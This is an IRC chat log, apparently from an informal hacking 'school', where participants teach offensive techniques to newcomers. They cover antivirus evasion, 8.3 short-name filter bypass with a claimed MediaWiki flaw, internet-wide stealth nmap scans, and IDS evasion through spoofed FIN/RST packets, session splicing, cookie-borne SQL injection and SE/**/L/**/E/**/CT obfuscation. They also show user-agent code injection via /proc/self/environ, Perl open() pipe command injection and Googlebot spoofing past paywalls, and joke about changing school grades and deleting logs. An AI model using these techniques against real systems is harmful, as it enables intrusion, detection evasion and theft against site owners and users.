[06:53.16] <hatter> oh wow
[06:53.17] <MrThePlague> more like binder
[06:53.17] <hatter> lol
[06:53.20] <garrett> PUT ALL THE DEPS IN A BOX AND HOPE IT WORKS
[06:53.23] <MrThePlague> iddk
[06:53.25] <hatter> hahaha
[06:53.33] <Laurelai> but its a better way cause you arr writing new code
[06:53.36] <Laurelai> are*
[06:53.40] <Laurelai> relying on yourself
[06:53.41] <hatter> garrett: pp is a good perl compressor that shoves down to exe
[06:53.50] <hatter> garrett: you can cpan -i pp
[06:53.50] <derpfish> AV is kind of like if police didn't stop anyone whose picture they didn't already have
[06:53.50] <garrett> i heard pp was good
[06:53.57] <hatter> yea, I use it
[06:54.01] <hatter> go ahead Laurelai
[06:54.10] <derpfish> And in many cases it must match exactly, so changing hairstyle is enough
[06:54.29] <derpfish> New criminal? Forget it.
[06:54.41] <Laurelai> and thats what makes perl2exe
[06:54.43] <Laurelai> powerful
[06:54.49] <Laurelai> its a brand new criminal every time
[06:55.25] <derpfish> Actually, "brand new criminal" is the name of my Lil Wayne cover band
[06:55.44] <Laurelai> lol
[06:55.46] <c0s> Laurelai: are there many good polymorphic systems or frameworks for perl?
[06:55.46] <FoxInSocks559> lol
[06:56.00] <Laurelai> c0s: im not sure but its worth looking into
[06:56.17] <c0s> would be interesting if you could get basically the same code to generate brand new every time you perl2exe'd it
[06:56.32] <Laurelai> it would be indeed
[06:56.41] <Laurelai> mabey then people will use whitelists
[06:56.46] <Laurelai> instead of av
[06:56.48] <JackofCoins> Thats what I thought it was doing
[06:56.58] <hatter> TPE is pretty awesome
[06:56.58] <hatter> about that
[06:57.04] <hatter> trusted path execution
[06:57.05] <hatter> = whitelist
[06:57.07] <derpfish> Stub generators do that, pretty much
[06:57.07] <hatter> fuck AV
[06:57.28] <FoxInSocks559> Laurelai: are whitelists a windows only concept?
[06:57.45] <FoxInSocks559> i guess tpe is built into *nix
[06:57.46] <Laurelai> if we want to improve real security we need to break the bad security
[06:57.57] <Laurelai> FoxInSocks559: grsec
[06:58.02] <Laurelai> has some of it
[06:58.36] <n0de> oh snap time to leave work
[06:58.38] <n0de> bbl
[06:58.39] <n0de> OUT
[06:58.59] <JackofCoins> cya
[06:59.07] <Laurelai> so kids
[06:59.10] <osaka> kids
[06:59.13] <Laurelai> learn some perl for great justice
[06:59.17] <osaka> ^
[06:59.21] <Laurelai> and break all av
[07:00.21] <derpfish> I think I'm going to just sprinkle tidbits of joy inbetween talks
[07:00.34] <derpfish> Oh, I feel a tidbit coming on now!
[07:00.53] <derpfish> In Windows systems, there's this concept of "8.3"
[07:01.26] <hatter> ahahhahahahahahahhahahaha
[07:01.28] <hatter> DO IT
[07:01.42] <derpfish> Back in the days of DOS, files had length limitations. They had to be at most 8 characters for the basename, optionally followed by a period and a three character file extension
[07:02.08] <hatter> the SQUIGGLE BUG!
[07:02.12] <hatter> sorry.  go ahead.
[07:02.12] <derpfish> Funny thing is, modern Windows systems still generate these names for files which don't comply with 8.3
[07:02.30] <hatter> ^
[07:02.38] <derpfish> So if you make a file named "shit.poo" it only has one name
[07:03.09] <derpfish> But if you make a file called "fecalmatter.crap", a second file system entry is made which points to the same file
[07:03.47] <derpfish> The conversion is done as follows: Take the first six characters of the basename, and add a tilde (~) and a number indicating which it is in the series of similar files
[07:04.09] <derpfish> Then, truncate the extension to three characters
[07:04.23] <MrThePlague> oh lord
[07:04.25] <derpfish> Also, remove any characters above 0x80 ( I think )
[07:04.53] <derpfish> So fecalmatter.crap becomes "FECALM~1.CRA"
[07:05.09] <MrThePlague> fecalmater.crazybitches
[07:05.21] <derpfish> Frequently, systems which must deal with these file names do not handle them correctly.
[07:05.51] <derpfish> For instance, this might allow you to bypass filters which prevent specific files from being requested from Web servers
[07:06.05] <derpfish> Some Web applications, for instance, check the URL with which they were accessed
[07:06.13] <c0s> derpfish: so uploading fecalmatter.phppoo becomes FECALM~1.PHP?
[07:06.33] <derpfish> Actually, it's both fecalmatter.phppoo and FECALM~1.PHP
[07:06.43] <derpfish> Two filesystem entries are written which point to the same file
[07:06.51] <hatter> ^
[07:06.57] <derpfish> Many Web servers are aware of this and handle it correctly
[07:06.57] <hatter> derpfish: grock that hax
[07:07.04] <hatter> <3
[07:07.05] <derpfish> But not all, especially older versions
[07:07.29] <derpfish> But imagine that a Web application relies on another application to include it before it functions
[07:07.41] <derpfish> Such that all the backend scripts do not need to perform authentication
[07:07.47] <derpfish> This is common.
[07:08.05] <derpfish> Now imagine that it checks the URL with which it is called to prevent being called directly
[07:08.26] <derpfish> Now what do you think happens if "backendscript.php" is called as "BACKEN~1.PHP"?
[07:08.33] <hatter> PREACH IT
[07:08.45] <derpfish> FIRE AND BRIMSTONE HAPPENS BROTHER
[07:08.53] <derpfish> CAN I GET AN AMEN
[07:08.57] <c0s> AMEN
[07:09.05] <p00pi3> AMEN
[07:09.33] <derpfish> PROTIP: This exists in the API script for MediaWiki on Windows
[07:09.39] <derpfish> WHOOPS DID I JUST DROP 0DAY?
[07:09.53] <hatter> Its not rly 0day
[07:09.55] <hatter> but like
[07:09.55] <hatter> Yeah
[07:09.55] <c0s> shit just got realer.
[07:09.56] <hatter> You fucked some shit up
[07:09.58] <hatter> by saying that
[07:10.00] <hatter> lol
[07:10.09] <MrThePlague> lol
[07:10.15] <MrThePlague> brb
[07:10.40] <derpfish> Right, so I'm done for the moment, tidbit over
[07:10.44] <Laurelai> lol
[07:10.45] <p00pi3> me2
[07:10.46] <Laurelai> nice tidbit
[07:11.05] <Laurelai> ^ thats the spirot
[07:11.08] <Laurelai> spirit*
[07:11.37] <JackofCoins> Ty Laurelai
[07:12.26] <derpfish> Who's next?
[07:12.46] <Laurelai> ok now always remember you are responsible for your own actions, you can humiliate whaitehats and stay out of jail at the same time
[07:12.55] <Laurelai> whitehats*
[07:13.13] <MrThePlague> I can humiliate many people
[07:13.15] <MrThePlague> ;D
[07:13.19] <raine> n keep your friends out of jail also -_-
[07:13.21] <MrThePlague> Never jail
[07:13.24] <p00pi3> i humiliate my parents all the time. -_-
[07:13.34] <c0s> p00pi3: pics
[07:13.50] <p00pi3> ;)
[07:14.58] <JackofCoins> Does anyone hack into their school and change their grades or is that last-century hacking shit? lol
[07:15.07] <derpfish> That's timeless shit, hahaha
[07:15.20] <derpfish> Schools are starting to get wise to that tho
[07:15.31] <MrThePlague> school network admin not strong at job
[07:15.34] <derpfish> Ten years ago they'd have no clue
[07:15.36] <derpfish> ^
[07:15.55] <JackofCoins> Do you have to know the software the teachers use to put grades in pretty well?
[07:16.07] <Laurelai> if they had a clue they wouldnt be the admin they would teach network sec
[07:16.28] <derpfish> Well any hacking is just about understanding how the rules of a system work and how that differs from how they *should* work
[07:16.47] <derpfish> So proper understanding of the school grade system is required to hack it
[07:17.27] <JackofCoins> Good point, lol, another random question, Is my MAC address as identifying/more identifying than my IP?
[07:17.49] <derpfish> More identifying. Your MAC never changes (though you can spoof it) but your IP changes all the time.
[07:18.18] <JackofCoins> And is it broadcast with my IP every time?
[07:18.23] <derpfish> Generally, with your MAC address, you can be traced back to where the computer was purchased, as long as they're keeping track of that somewhere down the supply chain
[07:18.38] <derpfish> It's only broadcast on your local network. It doesn't get past the router level.
[07:18.52] <derpfish> Sorry, not broadcast, sent
[07:19.44] <derpfish> Well, no one's talking, let's have some Q and A
[07:19.46] <JackofCoins> Alright cool, I was worried that tracing could occur with the mac address if the IP is not visible
[07:20.02] <FoxInSocks559> well it still can
[07:20.06] <derpfish> Try macchanger for Unix based systems or MAC Makeup for Windows
[07:20.09] <FoxInSocks559> are you talking about tor?
[07:20.18] <xo> tor is illegal
[07:20.22] <FoxInSocks559> no its not
[07:20.24] <xo> and u should be ashamed
[07:20.24] <derpfish> lololol
[07:20.32] <JackofCoins> Me? Im just talking in general
[07:20.33] <c0s> derpfish: on many systems with upload scripts, you have shown how people might get past filters, and im sure you have more to come.
[07:20.52] <derpfish> I have lots of tricks up my sleeve ;)
[07:20.57] <c0s> derpfish: so the question for me is, do you have methods to help discover the actual upload path if it isnt in the same directory as the upload script?
[07:21.04] <c0s> since a lot of them dont store it in the same location
[07:21.13] <hatter> I do c0s
[07:21.30] <c0s> that would be the next logical thing for me to see I think?
[07:21.38] <hatter> sure.
[07:21.38] <hatter> one sec tho
[07:21.40] <hatter> been drinking
[07:21.47] <derpfish> Same!
[07:21.47] <hatter> causality means piss time
[07:22.10] <derpfish> If you have the source, it's easy enough to look there
[07:22.52] <derpfish> Otherwise you can try to brute force guess the directory
[07:23.22] <derpfish> DirBuster is a good tool for brute force guessing directories
[07:23.41] <derpfish> But if you don't throttle it you can take shit down and give it away that you're attacking
[07:24.22] <derpfish> On a remote web site? Yes and no
[07:24.45] <derpfish> On your local system? Any hex editor.
[07:25.13] <derpfish> You need a vulnerability for that
[07:25.24] <JackofCoins> Is there a way to scan a range of IP's for Web Servers? Just to discover the websites with no domain name etc?
[07:25.34] <JackofCoins> I was going to try and write a python script but I cant find a Ping func for python lol
[07:25.36] <FoxInSocks559> nmap
[07:25.45] <derpfish> http://secunia.com/advisories/search/?search=source+disclosure
[07:25.54] <derpfish> There are plenty of source disclosure vulns out there
[07:25.56] <FoxInSocks559> nmap -sS -p80,443 0.0.0.0/0
[07:26.00] <derpfish> Some are even by web server
[07:26.03] <hatter> derpfish: tell me when and you'll have an ids evasion talk in hurr
[07:26.12] <derpfish> I mentioned the one with nginx on Windows before, for instance
[07:26.17] <JackofCoins> Would that nmap command map out every ip address in the world? lol
[07:26.24] <FoxInSocks559> lol yeah
[07:26.28] <FoxInSocks559> dont do it from home
[07:26.39] <derpfish> Some web servers might not be on those ports
[07:26.43] <JackofCoins> kk lol
[07:26.51] <c0s> indeed, a banner check might be better
[07:26.54] <derpfish> Other common ports include 8000, 8080, 8888, 8443
[07:26.56] <JackofCoins> I thought port scanning was legal?
[07:27.08] <derpfish> Port scanning is legal, depending on where you are
[07:27.09] <FoxInSocks559> jackofcoins: yes and no
[07:27.24] <FoxInSocks559> its legal on your own equipment
[07:27.27] <derpfish> The general consensus is that unless you're in a country like best korea, you're okay
[07:27.55] <derpfish> But if you gain unauthorized access to another machine or disrupt it, that's where it becomes illegal.
[07:28.30] <derpfish> But there's been something like one conviction for port scanning, and that was in some southeast asian country where a kid scanned a .gov machine
[07:28.49] <derpfish> If you're worried about it, go low and slow
[07:29.05] <derpfish> nmap's -T option is nice, -T 2 will be enough
[07:29.10] <FoxInSocks559> i think most people who do any serious portscanning probably do it via botnet anyway
[07:29.18] <derpfish> If you're scanning shit where you CANNOT be caught, -T 1 is nicer
[07:29.19] <FoxInSocks559> -T5 that shit!
[07:29.23] <derpfish> But slow as dicks
[07:29.31] <derpfish> I don't like -T5, it's inaccurate
[07:29.41] <derpfish> Anyway hatter, take the floor if you want it
[07:29.45] <derpfish> brb pee
[07:29.56] <hatter> ^
[07:29.56] <JackofCoins> Yea, I would just be scanning to find cool random websites that people didnt expect would be seen by other people lol
[07:30.00] <hatter> port scans with intent
[07:30.02] <hatter> are also illegal
[07:30.03] <hatter> proving you have intent
[07:30.04] <hatter> is like
[07:30.07] <hatter> almost impossible
[07:30.10] <hatter> but its still `illegal'
[07:30.36] <JackofCoins> Intent to break the law? Or just like me having the intent to find random websites?
[07:31.09] <FoxInSocks559> @jack: google does exactly what youre talking about all day long.
[07:31.24] <JackofCoins> But I cant even find my own website on google
[07:31.25] <FoxInSocks559> is there something in particular youre looking for?
[07:31.27] <JackofCoins> lol
[07:31.35] <FoxInSocks559> hmm
[07:31.50] <JackofCoins> Just websites people put up that are for their eyes only with no domain name etc
[07:32.06] <derpfish> Sure, there are plenty of interesting things to be found
[07:32.15] <JackofCoins> yea
[07:32.28] <derpfish> My thought is that if people put stuff up on the Internet it should be known that it's open to all
[07:32.30] <JackofCoins> just explorin is all lol
[07:32.51] <JackofCoins> Well yea but ive put up single-serving sites for me and friends only
[07:32.58] <JackofCoins> but also didnt care if others saw it lol
[07:33.05] <FoxInSocks559> if youre hosting from your home computer, and your home pc is attached to a "home internet" connection like thru comcast or something, google's probably not crawling your netblock looking for your server in the firstplace
[07:33.16] <hatter> ^
[07:33.28] <derpfish> Btw, WFuzz comes with nice lists for brute forcing web content
[07:33.29] <derpfish> http://www.edge-security.com/wfuzz.php
[07:33.46] <derpfish> But I'd just tear that shit out of there and use it in DirBuster or something else
[07:33.53] <JackofCoins> Well I'm on a shared web host but thats not what im concerned about to use google i'd have to be searching for a topic not just any random web server in existence, ya know?
[07:33.57] <derpfish> WFuzz can't be throttled
[07:34.06] <derpfish> lolololol
[07:34.09] <derpfish> Shared web hosting
[07:34.22] <JackofCoins> well idk whatever godaddy is ha
[07:34.41] <derpfish> http://www.yougetsignal.com/tools/web-sites-on-web-server/ Put your domain in there and see how many sites could be hacked which would result in your shit being owned too
[07:35.06] <c0s> derpfish: you could proxify it and that would basically throttle it
[07:35.24] <JackofCoins> Theres 4 other sites
[07:35.28] <derpfish> Sure, that's true, but the wordlists are easy enough to tear out and use with another tool
[07:35.34] <derpfish> JackofCoins: That's not TOO bad.
[07:36.09] <hatter> so like
[07:36.11] <hatter> who wants some ids evasion
[07:36.11] <JackofCoins> Lol one of the sites is a "CyberHunterXXX.net" site
[07:36.11] <hatter> ?
[07:36.18] <derpfish> Sure, I'll take it.
[07:36.40] <hatter> ok
[07:36.42] <hatter> here it comes
[07:36.43] <hatter> gimme like
[07:36.44] <hatter> 5 mins
[07:36.46] <hatter> gettin set up
[07:36.49] <JackofCoins> lol
[07:36.54] <hatter> (water & snack)
[07:36.57] <derpfish> I wonder if hacking a web site on a shared host you have space on is actually a violation of the DMCA
[07:36.57] <hatter> (ash tray & cigs)
[07:37.07] <derpfish> "unauthorized access to computer system"
[07:37.15] <derpfish> Same system, authorized access
[07:37.29] <derpfish> Probably wouldn't hold up in court XD
[07:37.30] <turbopinko> delete logs?
[07:37.51] <derpfish> Damn, for the first time in a while I could really go for a cig
[07:38.12] <derpfish> Got none and I'm sure as shit not going out to get em tho.
[07:38.42] <FoxInSocks559> about that yougetsignal thing, I saw this maltego thing that does that but represents it way more beautifully
[07:39.07] <FoxInSocks559> and a whole lot more
[07:39.56] <derpfish> Yeah, maltego has some nice transforms
[07:40.06] <derpfish> Never got much into it, but it's powerful as hell
[07:40.09] <hatter> ok guys
[07:40.13] <hatter> im rdy
[07:40.23] <hatter> Here we go
[07:40.26] <derpfish> Right, quiet coyote boys
[07:40.28] <hatter> IDS evasion
[07:40.36] <hatter> You have multiple IDS targets you need to evade
[07:40.41] <hatter> target #1) NIDS
[07:40.46] <hatter> NIDS is the network layer.
[07:40.53] <hatter> Target #2) HIDS
[07:40.57] <hatter> That's the host layer
[07:41.13] <hatter> Target #3) LIDS (and this is what fucks most people)
[07:41.16] <hatter> That's the filesystem layer
[07:41.25] <hatter> it stands for logged/logging intrusion detection system
[07:41.28] <hatter> very similar to logwatch
[07:41.31] <hatter> etc
[07:41.37] <hatter> jsut something that reads your logs for you
[07:41.40] <hatter> so the question i
[07:41.41] <hatter> s
[07:41.48] <hatter> How can you craft an attack in such a way
[07:41.55] <hatter> that the network layer, the host layer, and the logging segments
[07:41.59] <hatter> Don't see shit?
[07:42.06] <hatter> There are a lot of solutions
[07:42.10] <hatter> and problems with each ones
[07:42.11] <hatter> *one
[07:42.18] <hatter> once you get to to LIDS & HIDS
[07:42.25] <hatter> Its very target specific
[07:42.26] <hatter> NIDS, however
[07:42.32] <hatter> can be very easily bypassed
[07:42.40] <derpfish> ^
[07:42.44] <Laurelai> kill -9 ossec
[07:42.45] <hatter> There are several ways to bypass a NIDS
[07:42.48] <Laurelai> :p
[07:43.06] <hatter> Laurelai: I'll pretend that action wouldn't trip SAMHAIN <3
[07:43.11] <Laurelai> heh
[07:43.28] <hatter> So
[07:43.31] <hatter> If you want to bypass NIDS
[07:43.40] <hatter> You have a few different methods you can use
[07:43.48] <hatter> METHOD 1:
[07:43.51] <hatter> Spoof FIN/RST packets
[07:44.00] <hatter> the sniffer might think that you actually hung up
[07:44.09] <hatter> but since the host sees the packets are out of sequence,
[07:44.15] <hatter> the host maintains the connection
[07:44.21] <hatter> while the network layer shit thinks it closed
[07:44.23] <hatter> METHOD 2:
[07:44.24] <hatter> USE SSL
[07:44.37] <hatter> a lot of the time NIDS can't decrypt ssl traffic in realtime
[07:44.38] <derpfish> ^^^^^
[07:45.02] <hatter> if your attack is encrypted, many times the target is forced to rely on HIDS and LIDS
[07:45.12] <hatter> since the network layer just sees encrypted shit
[07:45.23] <hatter> METHOD #3: SESSION SPLICING
[07:45.30] <hatter> now
[07:45.33] <hatter> this is some code
[07:45.43] <hatter> It takes effort to utilize session splicing
[07:45.49] <hatter> the implementation I typically use is in perl
[07:45.56] <hatter> using libwhisker2.
[07:46.00] <hatter> sec, I'll pastebin something up
[07:47.20] <hatter> http://pastebin.com/Qpyv7m8R
[07:47.31] <hatter> ^ is some gnarly LW2 utilizing written by xo
[07:47.40] <hatter> he's a code beast
[07:48.11] <hatter> download('/path/to/file?var=value','domain.tld')
[07:48.16] <hatter> n you're good.
[07:48.24] <hatter> Now that's for NIDS
[07:48.31] <hatter> How do you think we can evade HIDS and LIDS?
[07:48.59] <derpfish> Magnets!
[07:49.07] <hatter> Well, we've successfully evaded the network layer.
[07:49.09] <hatter> Now, for LIDS
[07:49.16] <hatter> We have to use an attack type that does not log
[07:49.23] <hatter> for example,
[07:49.29] <hatter> SQL/LDAP injections in a cookie value
[07:49.34] <hatter> the httpd does not log this.
[07:49.43] <hatter> why?
[07:49.49] <hatter> because cookies do not get logged by the httpd
[07:49.52] <hatter> as there are so many.
[07:49.59] <derpfish> This is also for security reasons
[07:50.04] <hatter> That's just an example.
[07:50.09] <derpfish> Cookies generally are used as authenticators
[07:50.12] <hatter> derpfish: youre right, explain why
[07:50.16] <hatter> Yep
[07:50.31] <derpfish> Logs, if compromised, would result in the compromise of sessions, or accounts, or more
[07:50.41] <hatter> ^
[07:50.50] <derpfish> Which is why seeing sensitive data in a URL should make you want to find the logs on that server.
[07:51.06] <derpfish> Because URLs are almost always logged
[07:51.15] <hatter> and so are user agents
[07:51.21] <derpfish> Truth
[07:51.25] <hatter> USUALLY.
[07:51.35] <hatter> ok
[07:51.40] <derpfish> I have words about user agents, but I will save them as a tidbit for when you're done hatter <3
[07:51.56] <hatter> I got more words for'em too <3
[07:51.58] <hatter> lol
[07:52.11] <hatter> in any case
[07:52.12] <hatter> ok so now
[07:52.19] <hatter> we can identify inputs that aren't being logged
[07:52.29] <hatter> we can identify ways to bypass the sniffers
[07:52.37] <hatter> how can we evade realtime scanning?
[07:52.40] <hatter> of the ram?
[07:52.45] <hatter> we've gotta evade a HIDS
[07:52.51] <hatter> so how would we do this?
[07:53.11] <hatter> (btw, some ideas would be nice, not that i dont know, looking for interactivity here)
[07:53.32] <derpfish> obfuscation?
[07:53.46] <hatter>  /mode -m
[07:53.50] <hatter> yeah
[07:53.58] <hatter> obfuscation is a good start
[07:53.59] <hatter> what else?
[07:54.02] <p00pi3> sending packets in the wrong order?
[07:54.09] <hatter> p00pi3: that also helps
[07:54.13] <hatter> not what I was looking for
[07:54.23] <yngjungian> encryption?
[07:54.24] <hatter> but both
[07:54.24] <hatter> are good answers
[07:54.30] <hatter> probably not
[07:54.32] <tokentkr> well maybe you could overload the target with enough valid info that the attacks go undetected
[07:54.36] <hatter> you can't really encrypt a ram layer
[07:54.36] <blahh> what about manipulating system executables to do your job or elevate your app
[07:54.39] <newtr0n> buffer overflow
[07:54.54] <p00pi3> hids is hardware intrusion detection system?
[07:55.00] <derpfish> Host
[07:55.00] <blahh> host*
[07:55.00] <hatter> tokentkr: that's a good idea too, for example, ISA Server can only handle 5k connections, any more than that, and the shit goes unnoticed
[07:55.04] <p00pi3> k.
[07:55.40] <tokentkr> or you could launch a diversion
[07:56.40] <hatter> The best way
[07:56.46] <hatter> to evade a HIDS
[07:56.53] <hatter> Is rly having no signature
[07:57.03] <p00pi3> O_o
[07:57.12] <hatter> hand crafting, or using some kind of randomization generator
[07:57.14] <Fr34K> ok
[07:57.17] <hatter> for example
[07:57.17] <hatter> older mysql
[07:57.18] <p00pi3> o
[07:57.23] <hatter> say you did get that cookie exploit
[07:57.33] <hatter> and you're using session splicing/https
[07:57.50] <hatter> SE/**/L/**/E/**/CT
[07:57.51] <hatter> ....
[07:57.55] <hatter> = SELECT
[07:57.56] <hatter> on older
[07:58.00] <derpfish> AWWWW YEAH
[07:58.00] <hatter> mysql variants
[07:58.11] <hatter> now this is just the example
[07:58.12] <hatter> but the ram layer shit
[07:58.17] <hatter> won't see SELECT
[07:58.19] <hatter> its not built to parse that
[07:58.24] <Anonym101> I nede ddos
[07:58.25] <hatter> especially since a lot of the times these days
[07:58.40] <derpfish> Anonym101: No you don't
[07:58.49] <p00pi3> lmao
[07:58.55] <anonyMau5> ^ x)
[07:59.09] <hatter> So anyway
[07:59.09] <hatter> a lot of the times
[07:59.11] <hatter> the ram layer shit
[07:59.23] <hatter> can barely even parse mysql sockets as is
[07:59.27] <hatter> if you're injecting binary
[07:59.29] <hatter> with urlencode()
[07:59.33] <hatter> into prepared statements
[07:59.37] <hatter> that thing is gonna be totally hosed
[07:59.45] <hatter> when you introduce that type of commenting
[08:00.06] <hatter> take it away derpfish
[08:00.18] <hatter> o
[08:00.21] <hatter> one more thing I'd like to point out
[08:00.25] <hatter> content-type
[08:00.27] <hatter> utf7
[08:00.28] <hatter> and unicode
[08:00.31] <hatter> can come in quite handy
[08:00.39] <hatter> if the server allows it
[08:00.45] <hatter> it does further fuck up detection stuff
[08:00.57] <hatter> since most are only built for utf-8
[08:01.01] <hatter> take it away derpfish
[08:01.12] <hatter> I believe you had something about user agents
[08:01.19] <derpfish> I certainly do!
[08:01.28] <derpfish> Some web sites will present different content for different web sites
[08:01.35] <derpfish> Er, different user agents
[08:01.39] <hatter> yea
[08:01.43] <hatter> different browsers
[08:01.44] <derpfish> <-- drunk and tired
[08:01.50] <hatter> give you access to different js and css
[08:01.50] <hatter> etc
[08:01.56] <derpfish> Not just different browsers but different devices
[08:02.00] <derpfish> And different sources
[08:02.12] <hatter> ^
[08:02.16] <derpfish> For instance, if you visit facebook from a mobile phone, you get a totally different facebook
[08:02.29] <derpfish> Other sites have similar functionality
[08:02.40] <derpfish> Reconnaissance is incredibly important.
[08:02.44] <derpfish> Vital
[08:02.50] <hatter> ^
[08:03.11] <derpfish> If hacking is understanding the difference between how a system works and how it should, then reconnaissance is the first half of any hack.
[08:03.20] <derpfish> Probably more
[08:03.41] <hatter> ^
[08:03.58] <hatter> actually
[08:04.03] <hatter> thats a pretty good definition of hacking
[08:04.06] <derpfish> You should at least try visiting any target as various mobile devices: Palm, Blackberry, iPhone, Android
[08:04.12] <derpfish> iPad, too
[08:04.17] <hatter> ^
[08:04.22] <hatter> dont fforget xoom
[08:04.25] <hatter> etc
[08:04.25] <derpfish> Sure
[08:04.30] <JackofCoins> So
[08:04.43] <hatter> There are a myriad of devices to impersonate
[08:04.46] <derpfish> The point is that you might get different functionality, and that functionality might be vulnerable where the normal content is not
[08:04.51] <JackofCoins> Could a web company offer their own browser to clients to hide clients-only exclusive pages?
[08:05.01] <derpfish> Possibly, yes
[08:05.12] <derpfish> But spoofing the user agent would likely bypass that "protection"
[08:05.12] <hatter> But it'd be vuln to netcat
[08:05.13] <hatter> lol
[08:05.26] <hatter> & tamper data
[08:05.27] <derpfish> There's also User Agent Switcher for Firefox
[08:05.39] <derpfish> Shit is so cash, I recommend it
[08:05.40] <hatter> yea
[08:05.43] <JackofCoins> Or a hacker could encrypt their own website by having their script only load for a specific browser header etc?
[08:05.49] <hatter> tamper data does that too
[08:05.56] <hatter> JackofCoins: doubt it
[08:06.02] <JackofCoins> Like one that has to be changed to some long hash-code looking name for the browser?
[08:06.03] <hatter> JackofCoins: it would be remotely exploitable
[08:06.04] <derpfish> JackofCoins: That wouldn't be encryption, unless the User Agent was the encryption key
[08:06.11] <hatter> ^
[08:06.15] <hatter> n then it would still be
[08:06.16] <derpfish> But you could have the site only load for a specific User Agent
[08:06.21] <hatter> remote exploitable
[08:06.32] <hatter> cuz you could figure out that user agent
[08:06.35] <hatter> that is allowed
[08:06.35] <JackofCoins> yea like a public key kind of
[08:06.46] <hatter> nah
[08:06.48] <hatter> more like
[08:06.50] <hatter> symmetric
[08:06.53] <hatter> vs. asymmetric
[08:06.56] <hatter> encryption
[08:07.06] <JackofCoins> yea
[08:07.12] <hatter> symmetric-style fail
[08:07.15] <derpfish> One last thing about user agents
[08:07.18] <derpfish> Search engines
[08:07.34] <derpfish> Some web sites present different content to search engines
[08:07.36] <hatter> I got one more when you're done derpfish
[08:07.53] <derpfish> Google, for instance, browses with the "Googlebot" user agent
[08:07.58] <hatter> ^
[08:07.59] <hatter> ours included
[08:08.03] <hatter> notice there was no cache
[08:08.06] <hatter> of canthack.us
[08:08.06] <hatter> etc
[08:08.20] <derpfish> I once found a site which served scholarly articles behind a paywall
[08:08.40] <hatter> google cache sploitable.
[08:08.46] <derpfish> Except that Google was able to index the contents of the articles so they could be searched via Google
[08:09.09] <derpfish> Visiting the site with a user agent of "Googlebot" allowed unlimited free access to all articles.
[08:09.12] <hatter> ^
[08:09.18] <hatter> ^
[08:09.23] <Laurelai> google cache allows you access to many paywall sites
[08:09.29] <hatter> MANY SITES ARE VULN TO THIS
[08:09.29] <Laurelai> if they dont do it
[08:09.33] <Laurelai> tit fucked their SEO
[08:09.40] <Laurelai> it fucks*
[08:09.45] <hatter> not always
[08:09.48] <hatter> but in many cases
[08:09.50] <derpfish> APPLE BOTTOM JEANS, BOOTS WITH THE FUR.
[08:09.53] <hatter> Laurelai is correct
[08:09.56] <derpfish> Take it away, hatter
[08:10.04] <hatter> so
[08:10.06] <hatter> user agents
[08:10.11] <hatter> in php & ruby & python
[08:10.13] <JackofCoins> lol damn
[08:10.19] <hatter> (I havent messed ith a perl web app yet)
[08:10.28] <hatter> become environment vars
[08:10.43] <derpfish> Oooooooh
[08:10.44] <hatter> and are accessible in /proc/self/environ
[08:10.46] <hatter> if you can make that file execute
[08:10.55] <derpfish> Tiny tidbit for perl's open(), remind me in a bit
[08:10.57] <hatter> you can make your user agent contain code
[08:11.00] <hatter> and have a fuckin hayday
[08:11.08] <hatter> go for it derpfish that was all I had to add
[08:11.09] <hatter> lol
[08:12.31] <JackofCoins> lol
[08:13.12] <derpfish> Perl has a function, "open()"
[08:13.22] <derpfish> It allows for file handling
[08:13.44] <hatter> ^
[08:13.54] <hatter> xo talked about this before, but derpfish is re-iterating
[08:13.56] <hatter> take it away.
[08:13.56] <derpfish> You pass it a file name and it creates a handle for reading/writing
[08:14.00] <hatter> PREACH IT
[08:14.06] <derpfish> HOWEVER
[08:14.21] <derpfish> Surrounding the name of the file with pipe characters "|"
[08:14.34] <derpfish> Causes it to instead be interpreted as a system command
[08:14.51] <derpfish> And the output of that command is then read as a file
[08:15.00] <hatter> HUR DURR
[08:15.02] <hatter> lol
[08:15.26] <JackofCoins> This works on all systems running perL?
[08:15.31] <hatter> Functionality & Flexibility = vulnerability.
[08:15.41] <derpfish> It is a function of perl, not on the systems upon which perl runs
[08:15.45] <hatter> JackofCoins: assuming the application does not strip the ccharacters
[08:15.47] <derpfish> s/on/of/
[08:15.51] <hatter> then yes
[08:15.53] <derpfish> ^
[08:16.12] <hatter> like I regex the hell outta my user inputs
[08:16.13] <hatter> but if the programmer didnt do that
[08:16.16] <hatter> pwned
[08:16.30] <JackofCoins> Would it be incredibly easy to compromise my shared hosting computer by uploading a perl cgi script or whatever?
[08:16.38] <hatter> well like
[08:16.40] <derpfish> Possibly.
[08:16.41] <hatter> if you're on a shared hos
[08:16.44] <hatter> t
[08:16.47] <hatter> you want to go for bad perms first
[08:17.15] <JackofCoins> I believe I can set file permissions to 777 but maybe not lol
[08:17.38] <JackofCoins> via ftp
[08:20.46] <JackofCoins> but im having trouble getting on my web host to check, please go on :)
[08:21.54] <derpfish> Oh, that tidbit is finished actually
[08:25.13] <FoxInSocks571> finally : )
[08:25.17] <raine> 13n_n
[08:25.30] <Laurelai> im working on a tutorial on backdoors
[08:25.43] <FoxInSocks086> This might be a foolish question but I want to start reading up on Cyber Security/Hacking, etc. Besides a school, are there any sites that would suggest?
[08:26.09] <derpfish> securitytube is a good place for video demos
[08:26.22] <FoxInSocks571> do u guys have some sources for sec? i just wanna see how fucked up my code is and how deep i'll get into it
[08:26.44] <JackofCoins> Im looking for text my speakers are broken
[08:26.45] <hatter> sec?
[08:26.50] <FoxInSocks086> Securitytube? Never heard of it, I'll check it out now
[08:26.52] <FoxInSocks571> and do u manually check input fields for bad / no validations or is there a certain application u'd prefer?
[08:26.58] <derpfish> It's pretty basic tho
[08:27.08] <hatter> FoxInSocks571: tbh,
[08:27.21] <hatter> FoxInSocks571: Writing your own app after doing lots of by hand testing is the way to go
[08:27.32] <anon9819823> Hello all.
[08:27.45] <hatter> write your by-hand methodology into a piece of code
[08:27.47] <hatter> replace yourself
[08:27.49] <hatter> with code
[08:27.53] <hatter> n then
[08:27.58] <hatter> u amazing
[08:29.12] <anon9819823> I think fox in socks is a botnet.  :D
[08:29.47] <p00pi3> haha
[08:30.00] <loves2splooj> wow didn't know about securitytube
[08:30.00] <loves2splooj> tthanks for that
[08:30.03] <FoxInSocks571> what about frameworks? e.g. do u look for 0days for zend or symphony? do u study the code by ur self? or do u just target on sites written without any kind of framework ?
[08:30.27] <loves2splooj> when will this full talk be uploaded?
[08:30.45] <Rode0s_> Still 4 hours right?
[08:31.07] <loves2splooj> i just found out about the school
[08:31.15] <loves2splooj> twhen did it start?
[08:31.28] <JackofCoins> a long time ago
[08:31.36] <Rode0s_> In a galaxy
[08:31.39] <JackofCoins> far
